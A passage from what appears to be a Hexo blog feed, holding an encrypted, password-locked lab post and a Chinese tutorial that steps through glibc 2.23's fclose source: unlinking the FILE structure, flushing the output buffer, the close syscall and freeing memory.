22cb445462075cc1fdc58b71afd4500c9ad322b2bb20104054023c5a1610f46fb35b220ccfef01ce0728f924f16f940abcf47b804eb3e1ec3597a70524e363cd3f19dae0e359ec3a7acc89fbb456db54d3d296f0848316bfb90b9ef293a606398d4990e426afe4321a8fe09d8de46c803a444827a4a6fb58381ef56cfd12b6b873d368902c77120b052ef79769a4467fb0014b5f31274281c009dc99f11d924e932f61bb5d46f53481efeafc400f6fc5e3dcab6778183f34b3cdf36a7439ed6999de705791b0d7a9005eb646b164739ff76f603d03c8c17eaa5e3a7877fc1e29bf73f26231ef364e89d07907349dfa21457edd46c79288786557770b176ff00b82cabc442cbd7a12bb858fe8b985416b2c3aeb72ebed993b4cb916ec11a717716d62d936e5d400f01a7ea072d7954bbe15f1842719847cb295c68f3bea34ff51e0947435a4f6818d3cc6e1ef39c9d16c18ded24f98234305477531a40fe2820d773fa70136d6b883d8e8afabe4632c6a301eb98dee4717cf6895670208fdebd7a419327e609cba870dbd3fbd4d891f6f7ab7cf1d7fcefac594ae1592594176e95a9e008f8a641c96f429c6b3911478894d058548728b82cbb956ff36b20345a7bf6f6f2d6f9bc0e0c1468a849039be510863744ea5bed423493a30e7b1c614aa6ef4599cd42531cc45deb85108cabb9ebb845a4fc99b347d100b2bcdab1fd6c3d6b79686b020394421ba883b276c76c66d2bbef571c8408831ef3194fc52bed78bb78f2c6dcba1e942372b6ef211683bee6069f00a7d92ecfeca26a5f149dc72649f57283afbb2a95eba1b4fb8b9f3255d0f89d7a245540ac7a16f0a0412718f840fa268f0572d46d66943a3f1cfda6d004f860325e82eaa56f4fde2bd11ed482b72a8d9383eb23438bf0aee0f460951c82749a6c40259d9010d3cd90425e08ad69e8bdd87305120e45d5bbaea2d8d01b3ad62b8b4dbfa2ba33460fa3194b82bb036bf9e4cfa6d3bdca060f14c53679abc294f36cb73963bce8630e8fb7d975586bc43f49214681c069778db779080424c21fa227e66424baf37714b65c75e64feb5c2ca44dcb733e9a6ab09e4acd6a5df0b6b8c4db8e2cba3712b36fc43c18321429331e00e6128a945837c878b80e324fae88b712c646c91e6def1f349a811f18a3de8127f25637ce7d6c5a16ed3713aebcfbe96636a25c61bc4760f98775f2f595ae59b49b7155398159afb3cbbcd08ac580b869cf77c89697950be5cefa2c79fc1cfd9a46cf2a396e0634ebfcfa72a71329843abc6e3d7d2a94a1320282576e2024076c86946083663829e062623950a5b32efaa0fb631bdc7b350121c791282800503ef6b079522968d871eab91b042dd4dfed2db5bcc6b7ca7f25b53690b5e7704e24176198c85d22db7236bee893d9f6f343f6691b209015d7a6df6e9384986428477fb9f15b30bfe3141ef6ba3ca5b65f4f621884e6a9c97917f61fe8c23a2652b266bff36d6bfd4b92427a79caea5d53ef80ad47d966c495f10db0d1158acdbef41232bfd0ed45f7494f1187bdebf69c3c10194f74d336b23ef95dcbb2c87026882b723ea44c9580a0c2bf34206b5c344d3e95f0eb7f885f419d7b483eb700b9b9b60f0627cb57dcd019b958669aec52d321cb713aa7cd4b841960f592a7211d83dc1fa5aaf0fe5d6c3c3108605b859a0d5eae95c430b88e2fcca38791009413e958411d6bd1fc03bf60bcd4e8993ecd143cc61d39a557d45c32f35b2e9f554971d110418dfd8a38c5bd4f6bad391c49b2a20550d7707594d1298b56205fdcf6250ac2e3226ac5defc1d6639053a49570890cfd4a6ee9080754702e76b297f50b30050c580d32dcbe329c547b0ff986e2fd131d9066a0384a1e5873d2d6c7401d484141fce5362c177dc1690c1f55ade14a1dd85d1d3b7765f80a49c6ecc776589a3052a5f46eccd5a61515881edfe3cfd53970bdf596a3710bcbe5687ab43ba26e92dbdc9f20aac096fa818087ea1b6cd644aa597e6a0eeb3c96fc7c6528e6de428561813bcc5c6ea95dda5d7f043423bbe1be4fd12ed9aae7d9b898a3cb36b2428a82b07f70a8ccb40a82ec5ca6038bdea2b53a8b5cfd39522c51e5fe8fb14a6fa8e2f4ea8d21a75aacf689226afc7a060a034fb5ee51d0d096f06502b9bc3662e0c7e2e8dd0cfaef2ee5ac84f9a44d6cac1cd5f88e8920d993aadbee73ad27f1975f3b99dbf796040b00ba5b85aff1124894e4ea228a74af9c97ab39a986e01d68f729ac34732fee56ef7693788f0b437417ace82fd258548e79e5b62e8fcb28f9464d988fc905109c27369077f88a799db48d6618b668250afa29c9ef848e5eafd21d3f3994c9c09dca79fa92dd102bb9335a72dd1920694f2dbad8a283a406cd46ba7ebe0bc79fd90e74a5c374e5468faa2bcda3f18d39b069cfc00b0dc120f0f3f417b471606de83c58daeb70f626c6084771596989ed361772ae95f387d4af553636a18045b848d731675891e9fa033543b681b446fce8f9a88ae10049dca4c1ed764854ecd44995252ef143a46d6207c2bfe8991a0b2d707fba6b5f885cb1b6445433cb313c83aff10f11d13a299c3d01251ca7eccf1587123e4d91a2f99b167e264960f8d3b5ad8f029d76c84d7cd26304068d20692ecc03f1752c17e63327e307c2f782778a78062d8c667e68e593ca99565db3debb26d15ad4dab4f913e4c418b45a4283d37097076cd1ded77f7f07b7b2690c587fb047b82204511ebd50682d397ba40efa9f1c86c9162d4b44456b50d4057f26ca02403f64dc668e93dc7285c791127c3e95ded4168bd96498c2936b856d2d1562b483c4aa45d957fdc776d6b83322999f5fbd60483edfd5dff803196142a4c475c1211a8e516f45ee752b8d839ae37437ff7decc21029debecd7d5ef10e3d08727dded881fbd9c58ba7457c8b36f1e1651a3bcefe1783873d1f951f9e1c210b447fce8ac8a633e74ca387cdb7af8b344c029f73a833e4c24452ea01b4c2af356d90971c2b035e39521a8abaaf22a787176475c2f633ea51bf4f26387fc435e833ba7d0243710041939f438fe7bedd0b299f0de1bf6363e0b1da02b964f94bb79071657fd5e932ab4d3fc03dcb02a35a41638da8e895cb945ac4169252a7c852331af67358d07596a02ca2ff6fe923225c1ded0b7404ff9d4f1f69db45c75bd37de00825658b93b8a4678abab3fc65ff0c1268809d394dd983df50aa98a5de0299cb704908b8dc5ab96a0784af50fba99be91a2440137cbdddec78ad191c0f817a56a70a96f115ab0774b56abc34947f1579540e9bf235aec412078201542f00d2ae7f6289182ea07afcab3138e8fabe118f4fc65cd976393d9d342dff219c637e073eb1b6b38b80bf3c3dbdafdea09d4f49e7c17f0f14ddc5405d453b73c5c81df838259e101781456d756e38818bca6c188175437b32ac749ea3719c4782843058b3334369f2584b2fd7c7415b9df72b6bdb14004a6f843e6b59652b36a33df925cf7c7e5b45427d672dd0e26005b26dcfa1986ef5a183b41c6c34b85aa699d6c7bdb6acdd2f9b214948801999a156c2df8b79646331c407c0959b43c0d90b317b67ac5b7c23078205b0b51bf0cbce12ac9ae60caf558a4bdf44779eb9b4c01521d53a697dd4ebe8db581eb59a4ae662eb8b5ebb180a63b9f38045671ab0650a4f09a63c954cfcbd4ba287faf222759b7065e67dc79aabb965ec93c2fe696f17828169ad9d6ac09f55f041daaae695666629f2efc7a3787c602d0e68b88944df5a0996fad7b43c2b2c07b186ff687f0d7b5cf8bb471d45fcc062a189fb4a14bbcc11cb6b3920ca59ba27da20c3d0e24af0b5a389e2e7d8f4b4eecf6ee43ccead2d04117c402c1ba2c93bbb947fe3ee2af8845f9deb2f546ed052b366065624443cea2452c06d37865f9b66364dbb343b0d973b59718828c87fc3eca6f533a901914ccbac64ea7c3be4e517fde52a4444e13a5b02c15b748a39757625bd48185b495cb08f899a85adefa3c607e8b41bfe413f2353d9fbeda59ff4c2b454b9a8d924964dc9085c5c6fad511ffe360bd6c3b5ac1844ea1444ce1b025f733b8e01d13865518d1b8cfc2d6ea0cadd79af33adac134b3d4bdf196c7041b4222b4eb83797192145dfe14005adf74d7daeaab654cbb0c57c3364bc2198c64ffc8a6082320ecad39c0a42f77854ff11277f4207457a0b2f402c9737203623a9a3d4b271778b18c1ffa7f4624aafb5b91aad33b5ccf48f9d2064ece44c35490cd0c89f7878d8cdfde7e9a99025d5892787c4ebded8ff90473f04166ca420c0879cb161fecb0c302f6e94aa10ef7b697ba0b992ee6fae5938f88ef067ebf723c130cbe06a29ee2c1514c667d733101901fa0001816655d49ed10fce0efc51ce9a06b0e02dcb4f3fe8f81bdafe0950bfc9d1deb3eb85904302402111d6813b41182fdedeb370a6ed53f00094e00ffd0065e72cbfeed9e048b1e1b67b7a616d1dacf64433a47ac7699b68ec28a3aab135ddd994653fee29ebbc510f1357f4fe2369a48a5ec1b362e24f523659887a987c26494182d9a1a9612063c4eb9e8c0848cbf51620a84daa1e42e8b5361219c18999294b77330daeec410f433b3b33bae2801074cea07722636a6551930e8bdf4f8a49c5a24c1e99998086347efeed7dd187828038d51f485a2bf363d3dfe0c292f9376b1024334c4798af617a98efcc55c111c1c7e960e645ec87ad59afa7058ac7ff048a9b9deb4ec274e73036add5ed6efb804dbca6a8fa5587e5c4c8337022230b26b788185a1c0ae5c0e54f18ed550640da6e667f971714c44bec9d0ef8901775a1741529d972aa9ffdd66bafc2c1dd092a5d33277643e1abf812844780b11251bbcceb06383c3c0f834b451091411c4d83ecbf40e94e52405f049f07149686136695c1f7fff455b67392fd7510961ba6e957e3cc154066dcab534011c4be66e3b050bd2e680c74c798e2db6c5fdb35f621017b49000dd04891554162502a8f9fbcfd61d45b5db6c00eb0e2c774a97f9189e28fbe1e9d8d55e75a3ca39e4492a02817424162bc74b533691c29a0a42bff43adbca3d3a877d783b2c5bc0cb890d5c7ed16652c6a08006642b68b8cebcfa0fa553b4f23241da44cee6bad85f54c2d44c62e77786acecaeec72af5a9131c9840c1295f8fd49785370c95646154c18c8b5a2436d2b939b00d565e9c8d00da07e3ce91ae90ef243e2b9cb99f03e2080f658fe89af3419b2fdaf4e416b8a999ec0b1c588d5f51a863e08f35943118a8df9ddb3652e19f33877422d7f963a6a5ae619dae4189a2af512c7f4ef3bd66b4b199312be141e1bde65e2a19a70d52f5369c2a3bec4ce2708a5d3fb6542d351e9f16cd64629d310647f9cb36c77ae3722252be760672a550ecc7165e501195ed4c601c7edff5ac3f16b25c08961266f05ca72c1bf94cd208d0717b7e10bd272ac2657074f45108581463fd12cd06bbec2838374df27b908d5e8b49d237ef8aaf43fc438ef6c3899838854f28469648e6d47e07607ad6e66853aa5f9f3f5dfe708ab240f6449c42c466e84dea98d634cccb375f3f0d41d47adda1c84b4598030de25001a865f783c30f03f1abe461900dd6abd696370423d92cb6a93fd4cb44a374d0890bb93ee20da0e2d205292dc0ac1d870609dbf2652a3ec96e4ee34281c0e68e4feaae2c1e4ab682d673d6e588edccea88565a42a0b78fbe15dc4af76c3c345a305aa1796b37408d9221306945aa1855ed8f5f830ed7a73cd24d5820eb1e4baa8919fcd1afd24b8e90163c6940e5220ce8084732b121af8d8e43bf8e2165e9daecac0e03ff877663eb9e8052a0cafd8207200d7a2d03080b6402566564e80578d3b16fe078025c5ca3af83b4aa0c5950c7cb35081122aa75ac7b6b453f0f45e00029d2e86e55409a06155709b4f7fa0667328bb651677818b1eeeb5afccd6115fa889d9001842452772a9eefc09df8ef78b0b2e0e86e4ad4f738037f661e7d9853de954d08235d56e8753b0a607dbe4a2ee291dccc8fa3167e6ea27cfe2ef26b7cffbe6b5958898e97327700431273d29b48b7636ffa89bc6dfb89183613286c48f884e8620da6ec05549e96d0fae1ede3ebd065a8c3172f54cda2961b0361937c3d7595d5817ab472092990c2fd32569c2081250624150a4f7cbc8dc0eec464ceddb880d7c58d8a834be7bf17b7a4a57835793d430c343ae0c989373f4539cb32db63050920364d68e5f8b4cf300d9cfba6ab7896c054045112e04379242e8c60c688f62f08d0dc681efd4753cc4628df5dfab284b3893ba2e7e03ecbf9105ea65e6596a2c0570cbf623f4544cc5bfe37a32a79d445d237fb3522de51392d058f3e8a624f62b3b066af50847c9e544c1559d121018e081685cc1687f7530a20366d8298df9e336fd612028253559a9257521c0eba2fa7fe7430ea5b47480088c67dbad6537bcc71cbbf2831d67830044c66d3086e336d886b88673796b36e242efc984355563efa42f8acf7eb1b1a3c38491dfe3bc009812a98ee3e5f2af59aca8d20f8454a53012619e1e93d380489d1534e3bfdeb705729ce75a6167d5a2ebb67e673c4afddf81d3dde772034ddb498e484d755c66101fe3bc592757fdd134215e27e5ee596418cce7580897d3930886cb4018722053432d8552e83fb22bb304febb6de0ccf5624be55a3695671c06b97fe8eb73569168c7ab10affb6663dd57fdd6053b85a7586e8ed5332d0de21d17906ce6a9ba3ccac42d9a64997373f0f7608161fa4d5c9d9ac0197b6525115c2654c040edc85d0da68df2a266010666aaa23ccb26cc7319f558ee711ed5c1d5ac99e9534da7a662cee376ce848e70d787f5782ff1bc17ecd10e642b4cd01e8935c10f21d380bf46d5522429baecde10ce1cc3664271fcf3df07e0c6fe4fe55ad538e7b130640b3ca1f461ce08da3bf31b4f20c55678da344b70cb25c14a2481ca737c671121cf42e838d73220aa624dbf614282fb91fc80f9ffa30c7e38dd0e3913ee4d33373349811a364360e0cc96ef1633bcb97acd016b44faa9becccca29ad5189b54fc0cdc4deab15dae22c8680284dd209a6a537d85b30d272727e7408595e18f6f044923aaf3969ad70e65e091c5d1b347834e0c52ed3f748472d0bf7aeb407444e130bc5c5934d5865ae2ac4aa89e6dd61567abb9b054f9182d3f59f7d11d1af34fe928f8330d954b65ccb17b008323592fc60df0808b014db7139f5fc0bb51cbbc7a134f1bb96e99d07bf1b918cf3ca94fce94691ee48725c01d92022da3bac4bae7e50ca03ae0602343acf2f0f4860d54e7e141981fbadcbfb9fbc11d173fa5c3eda9c1a63a81e7f1e90b5128b6f678dad88827381b18ee2e821f5f9added496a79e64578f27421f7752a6b38c7bea208cabbc654d98601ae99c0f3d08724fb3d79164b101a7c685ec6a29af87cd9080fdf8a890c7e470cd5241a04313c594992cd5f1cd28ae96a893db56e9020d8c02f7107228e4baf7ae32e226ac6497ce0aaae3820cd17ba6051e3b822238e910df7a501039c4bf526e70bb7a739db2b2b4df6927f45408e237a673cd3692168d59a590c1acb38477f4f4d5025267f0016992880ba503224eb306180ccdcc82f6d9b0f7cea6c5f3f82015b9f1b5755f456cad0aa127636bb263968683adaec3d05d1d75f86f617d911d0a7ada479747ca46a955ee3045e9ae19e00e548875749a553efdbac084460f30cb6a8a84f03713b446c9a77424e27773bbcf6de38fda0e9c244f443972852ccba7bf2d9514af5270eb87287e4e11845202a46c6456b0e5376fd88b39870f701a0dbba13678c060fd6b15e093e42e35c26e439ebb9800c48f05068403a47d5a98bdea57fabb0ef50a8411893901928571d5e9c3b6d5e456ede7009de2445c7b7c26d36013136e0dc8a0cc8662a4c76b99edbfc1ffc2947f017562a15e9b62c28a262a5822a9cb45b256a121b7461977ad4359fcc04cffb73b97d73fb27048d8f85c4ba20e401d81d0b3d87f4fb46107796146d47f6418590952e7d65cec9cf4b0f1effaba8d07515f78ffa48e3a58e665328330e44578beb9b59f25ae92081864bf4cc8c35cc14861f99c89c7505445d11fd92085c593b028b308c6232ff8dd626a430b5c2823d0d44fde066376b79cfb4ff9a49d8de744a0d8b2e727f696f123a69a608adacfef6f90489a582c694529e5c3b5d74d37fa6f11826a9a200af5820d38a970049a38293c3394b604b7ff54834b4119b552827d0042eeedae7a19bc67fde970aa64018fdfadb9d68a736e93921382c6e877d33ff1f607d2e7f72733c8ade047747f63f45851d68e12e2c00d0f2990685cfb47f67d9cb1c2081b03a59a221a62a0f55af7f6201e81df5907094c4c75a27b602285000b605b74ecc69c5d9db65642b9227870e0a7fdbe0c77f3152d13e754333386a609ad7a74dee2005b81708ac7fff1e26f2bd039b2aa4658465ca4423680852a8b263645881bd407204928a95c18f2aba2023a8bb1642d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> 未初始化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO学习--源码分析fclose函数</title>
      <link href="/posts/b5738aac.html"/>
      <url>/posts/b5738aac.html</url>
      
        <content type="html"><![CDATA[<p>之前分析的三个函数文章链接:</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16578093.html">IO学习–源码分析fwrite函数</a></p><p>这篇是IO函数源码分析四部曲中的最后一个fclose函数(并不是以后不分析了，说实话我感觉分析源码去看看我们平常使用的函数到底是怎么实现的，这个过程很有意思，因此以后有机会的话会再调试一些其他函数，花了四天分析了这四个函数，从最开始分析fopen函数源码的时候懵懵逼逼(那篇文章我基本是纯配合着动态调试才搞懂的整体逻辑)，到分析fread函数时对reserve area以及输入和输出缓冲区有了认识，再到基本是对着源码分析的fwrite函数(也是配合着动态调试，不过此时就是静态分析源码为主了)，最后到分析fclose函数源码时感觉的异常顺利和自然。真的是分析每个函数时都有不同的感受。</p><p>emmm，感慨有些多了，下面进入正文。</p><h2 id="整体流程：">整体流程：</h2><p>下面是fclose函数的整体流程，其他师傅如果分析的时候，可以参考下图。</p><img src="https://s2.loli.net/2022/08/12/QDBqLfxORoUMbH8.png" alt="image-20220812201040809" style="zoom:50%;" /><h2 id="源代码">源代码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt+&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p><h2 id="源码分析">源码分析:</h2><p>先看第一部分，经过一些寻常检查后，去调用了_IO_un_link 函数。在fopen函数中新创建了_IO_FILE结构体，将其链入了_IO_list_all链表，而这个_IO_un_link 函数则是将fopen函数中创建的_IO_FILE结构体脱链（代码如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="脱链部分">脱链部分</h3><p>下面是_IO_un_link函数的源码，整体也很好分析。就是先去判断我们要脱链的这个_IO_FILE结构体是否为链表的头指针。如果是的话执行<code>_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain</code>来脱链（代码如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line">......</span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">  ++_IO_list_all_stamp;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要脱链的结构体不是链表头指针的话，就去遍历整个链表，去找到需要脱链的那个结构体，然后再脱链(代码如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="刷新输出缓冲区">刷新输出缓冲区</h3><p>脱链之后，调用了_IO_file_close_it函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>_IO_new_file_close_it函数中显示判断了一下文件是否有写的权限，如果有的话就调用_IO_do_flush函数来刷新输出缓冲区。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">·······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_do_flush是宏定义，调用了_IO_do_write函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><p>_IO_do_write函数对输出缓冲区的剩余部分（也就是宏定义中的(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base）进行了判断，如果输出缓冲区为0的话就直接返回，如果输出缓冲区中有数据的话就调用new_do_write函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new_do_write函数主要做了两件事，第一执行了系统调用write将输出缓冲区中的数据都读到了文件中。第二就是重置了_IO_write_ptr指针(这两个操作就意味着刷新了输出缓冲区)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="系统调用close">系统调用close</h3><p>而后随着new_do_write函数的返回，程序再次返回到_IO_new_file_close_it中，此时调用了vtable中的_IO_file_close函数(这个函数就不再说了，就是系统调用了一下close)，然后至此的话主要就剩申请的reserve area区域以及申请出来存放_IO_FILE结构体的内存还没有释放。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="将reserve-area释放掉">将reserve area释放掉</h3><p>最后_IO_new_file_close_it函数还剩下面这部分代码，先删除reserve area然后将read和write相关指针全部置空，最后调用_IO_un_link确保fopen函数申请的_IO_FILE结构体已经从_IO_list_all链表中脱链。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">//删除reserve area</span></span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将read相关指针全部置空</span></span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将write相关指针全部置空</span></span><br><span class="line"></span><br><span class="line">_IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure><p>这个_IO_setb函数代码如下，发现是先将reserve area这片内存给释放掉，然后清空_IO_buf_base和_IO_buf_end两个指针，这也就意味着将reserve area删除掉了。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将结构体fp的内存释放掉">将结构体fp的内存释放掉</h3><p>最后返回到_IO_new_fclose函数，先是调用了vtable中的_IO_default_finish函数(这个函数中做的操作，之前已经做过了，其实就相当于啥都没干)，然后最后将结构体fp释放掉。至此fclose函数结束。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _IO_release_lock (fp);</span><br><span class="line"> _IO_FINISH (fp);</span><br><span class="line">······</span><br><span class="line"> <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">   &#123;</span><br><span class="line">     fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">     <span class="built_in">free</span>(fp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure><h2 